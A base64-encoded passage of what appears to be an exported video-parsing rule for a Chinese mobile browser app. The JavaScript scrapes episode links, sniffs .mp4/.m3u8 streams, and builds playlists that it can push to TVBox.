ZWcnLCAnLnBuZycsICcuaWNvJywgJy5zdmcnXVxcbiAgICAgICAgICAgIH07XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHZhciB1cmx4ID0gdGZwdXNoID09ICcwJyA/ICd2aWRlbzovLycgKyBpdC5ocmVmIDogJ2hpa2VyOi8vcGFnZS9wdXNoP3J1bGU9WFlR5o6o6YCBJnB1c2h1cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgIFxcXCJuYW1lXFxcIjogZ2V0UGFnZVRpdGxlKCkgKyB0LFxcbiAgICAgICAgICAgICAgICBcXFwidXJsXFxcIjogaXQuaHJlZlxcbiAgICAgICAgICAgIH0pKTtcXG4gICAgICAgICAgICB2YXIgZXh0cmF4ID0ge1xcbiAgICAgICAgICAgICAgICBpZDogaXQuaHJlZlxcbiAgICAgICAgICAgIH07XFxuICAgICAgICB9XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiB0LFxcbiAgICAgICAgICAgIHVybDogdXJseCxcXG4gICAgICAgICAgICBwaDogdCArIFxcXCIkXFxcIiArIGl0LmhyZWYsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzNcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiBleHRyYXhcXG4gICAgICAgIH0pO1xcbiAgICB9XFxufVxcbmlmIChkLmxlbmd0aCA9PSAwKSB7XFxuICAgIC8v5Yy56YWN5aSx6LSlXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIlxcXCIsXFxuICAgICAgICB1cmw6IHVybCxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwieDVfd2Vidmlld19zaW5nbGVcXFwiLFxcbiAgICAgICAgZGVzYzogXFxcImZsb2F0JiYxMDAlXFxcIixcXG4gICAgICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBjYW5CYWNrOiB0cnVlXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICB0b2FzdChcXFwiQUnljLnphY3lpLHotKXvvIzlt7Lkvb/nlKhYNeWKoOi9vVxcXCIpO1xcbiAgICBzZXRSZXN1bHQoZCk7XFxufSBlbHNlIHtcXG4gICAgLy/kuLrnur/ot6/liqDliIblibLnur9cXG4gICAgbGV0IGQyID0gW107XFxuICAgIGxldCBtdGFiID0gW107XFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZC5sZW5ndGg7IGkrKykge1xcbiAgICAgICAgZDIucHVzaChkW2ldKTtcXG4gICAgICAgIG10YWIucHVzaChkW2ldLnBoKTtcXG4gICAgICAgIGlmIChpIDwgZC5sZW5ndGggLSAxKSB7XFxuICAgICAgICAgICAgbGV0IGl0ID0gZFtpXTtcXG4gICAgICAgICAgICBsZXQgdDEgPSBwYXJzZUludChjbGVhclRleHQoaXQudGl0bGUpKTtcXG4gICAgICAgICAgICBsZXQgbmV4dCA9IGRbaSArIDFdO1xcbiAgICAgICAgICAgIGxldCB0MiA9IHBhcnNlSW50KGNsZWFyVGV4dChuZXh0LnRpdGxlKSk7XFxuICAgICAgICAgICAgaWYgKHQyIC0gdDEgPiAxIHx8IHQxIC0gdDIgPiAxKSB7XFxuICAgICAgICAgICAgICAgIG10YWIucHVzaCgnIycpO1xcbiAgICAgICAgICAgICAgICBkMi5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcIlxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICAgICAgZDIucHVzaCh7XFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVfYmxhbmtcXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBkMi5wdXNoKHtcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcIlxcbiAgICAgICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgIH1cXG4gICAgbGV0IHBsYXlsID0gbXRhYi5qb2luKCcjJykucmVwbGFjZSgvIyMjL2csICckJCQkJCQnKTtcXG5cXG4gICAgbGV0IGZyb20gPSBbXTtcXG4gICAgZm9yICh2YXIgaiA9IDA7IGogPCBwbGF5bC5zcGxpdCgnJCQkJykubGVuZ3RoOyBqKyspIHtcXG4gICAgICAgIGZyb20ucHVzaChcXFwi5pKt5pS+5YiX6KGoXFxcIiArIFtqICsgMV0pO1xcbiAgICB9XFxuICAgIGxldCBwdXNoID0gSlNPTi5zdHJpbmdpZnkoe1xcbiAgICAgICAgXFxcIm5hbWVcXFwiOiBtdnRpdGxlLFxcbiAgICAgICAgXFxcImZyb21cXFwiOiBmcm9tLmpvaW4oJyQkJCcpLFxcbiAgICAgICAgXFxcInVybFxcXCI6IHBsYXlsLnJlcGxhY2UoL1xcXFwmL2csICfvvIbvvIYnKVxcbiAgICB9KTtcXG4gICAgLy9sb2cocHVzaCk7XFxuXFxuICAgIGQyLnVuc2hpZnQoe1xcbiAgICAgICAgdGl0bGU6IFxcXCLmjqjpgIHlvZPliY3pobXliJfooajliLBUVkJveFxcXCIsXFxuICAgICAgICB1cmw6ICQocHVzaCkubGF6eVJ1bGUoKCkgPT4ge1xcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3B1c2g/cnVsZT1YWVHmjqjpgIEmcHVzaHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGlucHV0KTtcXG4gICAgICAgIH0pLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJzY3JvbGxfYnV0dG9uXFxcIlxcbiAgICB9KTtcXG5cXG4gICAgZDIudW5zaGlmdCh7XFxuICAgICAgICB0aXRsZTogKGdldEl0ZW0oJ3dlYnB1c2gnLCAnMCcpID09ICcxJyA/ICfljZXpm4bmjqjpgIHwn5+iJyA6ICfljZXpm4bmjqjpgIHwn5S0JyksXFxuICAgICAgICB1cmw6IGBoaWtlcjovL2VtcHR5QGxhenlSdWxlPS5qczpnZXRJdGVtKCd3ZWJwdXNoJywnMCcpPT0nMSc/c2V0SXRlbSgnd2VicHVzaCcsJzAnKTpzZXRJdGVtKCd3ZWJwdXNoJywnMScpO3JlZnJlc2hQYWdlKCk7J3RvYXN0Oi8v5YiH5o2i5oiQ5Yqf77yBJ2AsXFxuXFxuICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nXFxuICAgIH0pO1xcbiAgICBzZXRSZXN1bHQoZDIpO1xcbn1cIixcImdyb3VwXCI6XCIy5o6o6YCBXCIsXCJ1YVwiOlwibW9iaWxlXCIsXCJwcmVSdWxlXCI6XCJcIixcInBhZ2VzXCI6XCJbe1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5LqM57qn6Kej5p6QXFxcIixcXFwicGF0aFxcXCI6XFxcInBcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgZCA9IFtdO1xcXFxubGV0IHVybCA9IGJhc2U2NERlY29kZShnZXRQYXJhbShcXFxcXFxcInVcXFxcXFxcIikpO1xcXFxubGV0IG12dGl0bGUgPSBiYXNlNjREZWNvZGUoZ2V0UGFyYW0oXFxcXFxcXCJtb3Z0aXRsZVxcXFxcXFwiKSk7XFxcXG5sZXQgaHRtbCA9IHJlcXVlc3QodXJsKTtcXFxcbmxldCBhbGlzdCA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiZhXFxcXFxcXCIpO1xcXFxubGV0IGFyciA9IGFsaXN0Lm1hcChpdCA9PiB7XFxcXG4gICAgcmV0dXJuIHtcXFxcbiAgICAgICAgLy9odG1sOiBpdCxcXFxcbiAgICAgICAgdGV4dDogcGRmaChpdCwgXFxcXFxcXCJhJiZUZXh0XFxcXFxcXCIpLFxcXFxuICAgICAgICB0aXRsZTogcGRmaChpdCwgXFxcXFxcXCJhJiZ0aXRsZVxcXFxcXFwiKSxcXFxcbiAgICAgICAgaHJlZjogcGQoaXQsIFxcXFxcXFwiYSYmaHJlZlxcXFxcXFwiLCB1cmwpXFxcXG4gICAgfVxcXFxufSk7XFxcXG4vL2xvZyhhcnIpO1xcXFxubGV0IGRlYnVnID0gZmFsc2U7XFxcXG5cXFxcbmZ1bmN0aW9uIGNsZWFyVGV4dChpdCkge1xcXFxuICAgIHJldHVybiBpdC5yZXBsYWNlKC/nrKx86ZuGfOeroC9nLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gaXNNb3ZpZShpdCkge1xcXFxuICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfVxcXFxuICAgIGxldCB0aXQgPSBpdC50aXRsZSB8fCBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIGl0ID0gaXQudGV4dCB8fCBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIGlmIChpdCA9PSBcXFxcXFxcIlxcXFxcXFwiIHx8IGl0Lmxlbmd0aCA+IDgpIHtcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICAvL+aOkumZpFxcXFxuICAgIGxldCByZWcgPSAvXFxcXFxcXFwufOmrmOa4heebtOaSrXzlhpnnnJ/mjqjojZAvO1xcXFxuICAgIGlmICh0aXQgIT0gXFxcXFxcXCJcXFxcXFxcIiAmJiAhdGl0LmluY2x1ZGVzKGl0KSB8fCByZWcudGVzdChpdCkpIHtcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gaXQubWF0Y2goL+WOn+eUu3zlpIfnlKh86JOd5YWJfOi2hea4hXzpq5jmuIV85q2j54mHfOmfqeeJiHw0S3w0a3wxMDgwUHw3MjBQfFRDfEhEfEJELylcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gbm90Q2hhcHRlcihpdCkge1xcXFxuICAgIGlmIChpdCA9PSBudWxsIHx8IGl0LnRleHQgPT0gbnVsbCkge1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGl0LnRleHQubWF0Y2goL1swLTldXFxcXFxcXFwuWzAtOV3liIYvKTtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gaXNDaGFwdGVyKGl0LCBwcmUsIG5leHQpIHtcXFxcbiAgICBpZiAobm90Q2hhcHRlcihpdCkpIHtcXFxcbiAgICAgICAgLy/kvJjlhYjmjpLpmaRcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICAvL+WIpOaWreaYr+S4jeaYr+eUteW9sVxcXFxuICAgIGlmIChpc01vdmllKGl0KSkge1xcXFxuICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGlzQ2hhcHRlcjAoaXQsIHByZSkgfHwgaXNDaGFwdGVyMChpdCwgbmV4dCk7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldENoYXB0ZXJOdW0oaXQpIHtcXFxcbiAgICBpZiAoaXQgPT0gbnVsbCB8fCBpdC50ZXh0ID09IG51bGwpIHtcXFxcbiAgICAgICAgcmV0dXJuIC0xO1xcXFxuICAgIH1cXFxcbiAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBpZiAoaXQgPT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgICAgICByZXR1cm4gLTE7XFxcXG4gICAgfVxcXFxuICAgIGl0ID0gY2xlYXJUZXh0KGl0KTtcXFxcbiAgICBsZXQgcmVnID0gL15bMC05XSokLztcXFxcbiAgICBpZiAoIXJlZy50ZXN0KGl0KSkge1xcXFxuICAgICAgICByZXR1cm4gLTE7XFxcXG4gICAgfVxcXFxuICAgIGl0ID0gcGFyc2VJbnQoaXQpO1xcXFxuICAgIGlmIChpc05hTihpdCkpIHtcXFxcbiAgICAgICAgcmV0dXJuIC0xO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gaXQ7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGlzQ2hhcHRlcjAoaXQsIGJyb3RoZXIpIHtcXFxcbiAgICAvKmlmIChkZWJ1Zykge1xcXFxuICAgICAgICBsb2coe1xcXFxuICAgICAgICAgICAgaXQ6IGl0LFxcXFxuICAgICAgICAgICAgYnJvdGhlcjogYnJvdGhlclxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9Ki9cXFxcbiAgICBpdCA9IGdldENoYXB0ZXJOdW0oaXQpO1xcXFxuICAgIC8vaWYgKGRlYnVnKSBsb2coaXQpO1xcXFxuICAgIGlmIChpdCA8IDApIHtcXFxcbiAgICAgICAgcmV0dXJuIGZhbHNlO1xcXFxuICAgIH1cXFxcbiAgICBicm90aGVyID0gZ2V0Q2hhcHRlck51bShicm90aGVyKTtcXFxcbiAgICAvL2lmIChkZWJ1ZykgbG9nKGJyb3RoZXIpO1xcXFxuICAgIGlmIChicm90aGVyIDwgMCkge1xcXFxuICAgICAgICByZXR1cm4gZmFsc2U7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBpdCAtIGJyb3RoZXIgPCAyICYmIGl0IC0gYnJvdGhlciA+IC0yO1xcXFxufVxcXFxubGV0IHRmcHVzaCA9IGdldEl0ZW0oJ3dlYnB1c2gnLCAnMCcpO1xcXFxubGV0IF93ZWIgPSAkLnRvU3RyaW5nKCh0ZnB1c2gpID0+IHtcXFxcbiAgICBsZXQgdXJscyA9IF9nZXRVcmxzKCk7XFxcXG4gICAgbGV0IHJlZyA9IC9cXFxcXFxcXC5odG1sfFxcXFxcXFxcLmNzc3xcXFxcXFxcXC5qcy87XFxcXG4gICAgZm9yIChsZXQgayBpbiB1cmxzKSB7XFxcXG4gICAgICAgIGlmICghcmVnLnRlc3QodXJsc1trXSkgJiYgdXJsc1trXS5tYXRjaCgvXFxcXFxcXFwubXA0fFxcXFxcXFxcLm0zdTgvKSkge1xcXFxuICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5sb2codXJsc1trXSk7XFxcXG4gICAgICAgICAgICBpZiAodGZwdXNoID09ICcwJykge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFxcXFxcIlxcXFxcXFwiKSkgKyBcXFxcXFxcIiNpZ25vcmVJbWc9dHJ1ZSNcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHBsYXkgPSBmeV9icmlkZ2VfYXBwLmdldEhlYWRlclVybCh1cmxzW2tdLnJlcGxhY2UoLy4qP3VybD0vLCBcXFxcXFxcIlxcXFxcXFwiKSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL3BhZ2UvcHVzaD9ydWxlPVhZUeaOqOmAgSZwdXNodXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnkoe1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogZG9jdW1lbnQudGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwidXJsXFxcXFxcXCI6IHBsYXlcXFxcbiAgICAgICAgICAgICAgICB9KSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG59LCB0ZnB1c2gpO1xcXFxuXFxcXG5sZXQgd2ViID0gZ2V0SXRlbSgnd2ViJywgJzAnKSA9PSBcXFxcXFxcIjFcXFxcXFxcIjtcXFxcblxcXFxuZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG4gICAgbGV0IHQgPSBpdC50ZXh0O1xcXFxuICAgIGlmICghaXQuaHJlZiB8fCBpdC5ocmVmID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgY29udGludWU7XFxcXG4gICAgfVxcXFxuICAgIGxldCBwcmUgPSBpID09IDAgPyBudWxsIDogYXJyW2kgLSAxXTtcXFxcbiAgICBsZXQgbmV4dCA9IGkgPT0gKGFyci5sZW5ndGggLSAxKSA/IG51bGwgOiBhcnJbaSArIDFdO1xcXFxuICAgIGlmIChpc0NoYXB0ZXIoaXQsIHByZSwgbmV4dCkpIHtcXFxcbiAgICAgICAgaWYgKHdlYikge1xcXFxuICAgICAgICAgICAgdmFyIHVybHggPSBcXFxcXFxcIndlYlJ1bGU6Ly9cXFxcXFxcIiArIGl0LmhyZWYgKyBcXFxcXFxcIkBcXFxcXFxcIiArIF93ZWI7XFxcXG4gICAgICAgICAgICB2YXIgZXh0cmF4ID0ge1xcXFxuICAgICAgICAgICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXFxcbiAgICAgICAgICAgICAgICBpZDogaXQuaHJlZixcXFxcbiAgICAgICAgICAgICAgICBibG9ja1J1bGVzOiBbJy5tNGEnLCAnLm1wMycsICcuZmx2JywgJy5hdmknLCAnLjNncCcsICcubXBlZycsICcud212JywgJy5tb3YnLCAnLnJtdmInLCAnLmdpZicsICcuanBlZycsICcucG5nJywgJy5pY28nLCAnLnN2ZyddXFxcXG4gICAgICAgICAgICB9O1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgdmFyIHVybHggPSB0ZnB1c2ggPT0gJzAnID8gJ3ZpZGVvOi8vJyArIGl0LmhyZWYgOiAnaGlrZXI6Ly9wYWdlL3B1c2g/cnVsZT1YWVHmjqjpgIEmcHVzaHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogZ2V0UGFnZVRpdGxlKCkgKyB0LFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwidXJsXFxcXFxcXCI6IGl0LmhyZWZcXFxcbiAgICAgICAgICAgIH0pKTtcXFxcbiAgICAgICAgICAgIHZhciBleHRyYXggPSB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IGl0LmhyZWZcXFxcbiAgICAgICAgICAgIH07XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0LFxcXFxuICAgICAgICAgICAgdXJsOiB1cmx4LFxcXFxuICAgICAgICAgICAgcGg6IHQgKyBcXFxcXFxcIiRcXFxcXFxcIiArIGl0LmhyZWYsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiBleHRyYXhcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgfVxcXFxufVxcXFxuaWYgKGQubGVuZ3RoID09IDApIHtcXFxcbiAgICAvL+WMuemFjeWksei0pVxcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6IHVybCxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwieDVfd2Vidmlld19zaW5nbGVcXFxcXFxcIixcXFxcbiAgICAgICAgZGVzYzogXFxcXFxcXCJmbG9hdCYmMTAwJVxcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgY2FuQmFjazogdHJ1ZVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgdG9hc3QoXFxcXFxcXCJBSeWMuemFjeWksei0pe+8jOW3suS9v+eUqFg15Yqg6L29XFxcXFxcXCIpO1xcXFxuICAgIHNldFJlc3VsdChkKTtcXFxcbn0gZWxzZSB7XFxcXG4gICAgLy/kuLrnur/ot6/liqDliIblibLnur9cXFxcbiAgICBsZXQgZDIgPSBbXTtcXFxcbiAgICBsZXQgbXRhYiA9IFtdO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICBkMi5wdXNoKGRbaV0pO1xcXFxuICAgICAgICBtdGFiLnB1c2goZFtpXS5waCk7XFxcXG4gICAgICAgIGlmIChpIDwgZC5sZW5ndGggLSAxKSB7XFxcXG4gICAgICAgICAgICBsZXQgaXQgPSBkW2ldO1xcXFxuICAgICAgICAgICAgbGV0IHQxID0gcGFyc2VJbnQoY2xlYXJUZXh0KGl0LnRpdGxlKSk7XFxcXG4gICAgICAgICAgICBsZXQgbmV4dCA9IGRbaSArIDFdO1xcXFxuICAgICAgICAgICAgbGV0IHQyID0gcGFyc2VJbnQoY2xlYXJUZXh0KG5leHQudGl0bGUpKTtcXFxcbiAgICAgICAgICAgIGlmICh0MiAtIHQxID4gMSB8fCB0MSAtIHQyID4gMSkge1xcXFxuICAgICAgICAgICAgICAgIG10YWIucHVzaCgnIycpO1xcXFxuICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJiaWdfYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIGQyLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICBkMi5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmlnX2JsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICBsZXQgcGxheWwgPSBtdGFiLmpvaW4oJyMnKS5yZXBsYWNlKC8jIyMvZywgJyQkJCQkJCcpO1xcXFxuXFxcXG4gICAgbGV0IGZyb20gPSBbXTtcXFxcbiAgICBmb3IgKHZhciBqID0gMDsgaiA8IHBsYXlsLnNwbGl0KCckJCQnKS5sZW5ndGg7IGorKykge1xcXFxuICAgICAgICBmcm9tLnB1c2goXFxcXFxcXCLmkq3mlL7liJfooahcXFxcXFxcIiArIFtqICsgMV0pO1xcXFxuICAgIH1cXFxcbiAgICBsZXQgcHVzaCA9IEpTT04uc3RyaW5naWZ5KHtcXFxcbiAgICAgICAgXFxcXFxcXCJuYW1lXFxcXFxcXCI6IG12dGl0bGUsXFxcXG4gICAgICAgIFxcXFxcXFwiZnJvbVxcXFxcXFwiOiBmcm9tLmpvaW4oJyQkJCcpLFxcXFxuICAgICAgICBcXFxcXFxcInVybFxcXFxcXFwiOiBwbGF5bC5yZXBsYWNlKC9cXFxcXFxcXCYvZywgJ++8hu+8hicpXFxcXG4gICAgfSk7XFxcXG4gICAgLy9sb2cocHVzaCk7XFxcXG5cXFxcbiAgICBkMi51bnNoaWZ0KHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwi5o6o6YCB5b2T5YmN6aG15YiX6KGo5YiwVFZCb3hcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkKHB1c2gpLmxhenlSdWxlKCgpID0+IHtcXFxcbiAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9wYWdlL3B1c2g/cnVsZT1YWVHmjqjpgIEmcHVzaHVybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGlucHV0KTtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuXFxcXG4gICAgZDIudW5zaGlmdCh7XFxcXG4gICAgICAgIHRpdGxlOiAoZ2V0SXRlbSgnd2VicHVzaCcsICcwJykgPT0gJzEnID8gJ+WNlembhuaOqOmAgfCfn6InIDogJ+WNlembhuaOqOmAgfCflLQnKSxcXFxcbiAgICAgICAgdXJsOiBgaGlrZXI6Ly9lbXB0eUBsYXp5UnVsZT0uanM6Z2V0SXRlbSgnd2VicHVzaCcsJzAnKT09JzEnP3NldEl0ZW0oJ3dlYnB1c2gnLCcwJyk6c2V0SXRlbSgnd2VicHVzaCcsJzEnKTtyZWZyZXNoUGFnZSgpOyd0b2FzdDovL+WIh+aNouaIkOWKn++8gSdgLFxcXFxuXFxcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbidcXFxcbiAgICB9KTtcXFxcbiAgICBzZXRSZXN1bHQoZDIpO1xcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJ0ZXh0XzFcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5pCc57Si5rWL6K+VXFxcIixcXFwicGF0aFxcXCI6XFxcInNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5sZXQgdXJsID0gYmFzZTY0RGVjb2RlKGdldFBhcmFtKFxcXFxcXFwidVxcXFxcXFwiKSk7XFxcXG5sb2codXJsKTtcXFxcbmxldCBrZXkgPSBnZXRQYXJhbShcXFxcXFxcImtleVxcXFxcXFwiKTtcXFxcbmxldCBzcCA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9zcFxcXFxcXFwiKTtcXFxcbnNldFJlc3VsdChzcCh1cmwsIGtleSwgXFxcXFxcXCLmkJzntKLmtYvor5VcXFxcXFxcIikpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuiBmuWQiOaQnOe0olxcXCIsXFxcInBhdGhcXFwiOlxcXCJwcm9cXFwiLFxcXCJydWxlXFxcIjpcXFwidmFyIGQgPSBbXTtcXFxcbmlmIChNWV9QQUdFID09IDEpIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogXFxcXFxcXCLmkJzntKJcXFxcXFxcIixcXFxcbiAgICAgICAgdXJsOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgIH0pLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgICAgICBkZXNjOiBcXFxcXFxcIuivt+i+k+WFpeWFs+mUruivje+8jOWwvemHj+WwkeWtl+S4jeimgeWkmuWtl1xcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgZGVmYXVsdFZhbHVlOiBnZXRNeVZhcihcXFxcXFxcInNvdVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInNvdVxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwic291XFxcXFxcXCIpO1xcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwic29cXFxcXFxcIik7XFxcXG4gICAgfSkpO1xcXFxufVxcXFxuXFxcXG5sZXQgcyA9IGdldE15VmFyKFxcXFxcXFwic291XFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxubGV0IHIgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuaWYgKHMgIT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgIGxldCBwID0gTVlfUEFHRTtcXFxcbiAgICBsZXQge1xcXFxuICAgICAgICBsb2FkXFxcXG4gICAgfSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS9kYXRhXFxcXFxcXCIpO1xcXFxuICAgIGxldCB7XFxcXG4gICAgICAgIHdyYXBcXFxcbiAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFxcXFxcIik7XFxcXG4gICAgbGV0IGRhdGEgPSBsb2FkKHAsIHIgIT0gXFxcXFxcXCJcXFxcXFxcIiA/IHIgOiBudWxsKTtcXFxcblxcXFxuICAgIGxldCBwYWdlaWQgPSBNWV9SVUxFLnRpdGxlICsgXFxcXFxcXCI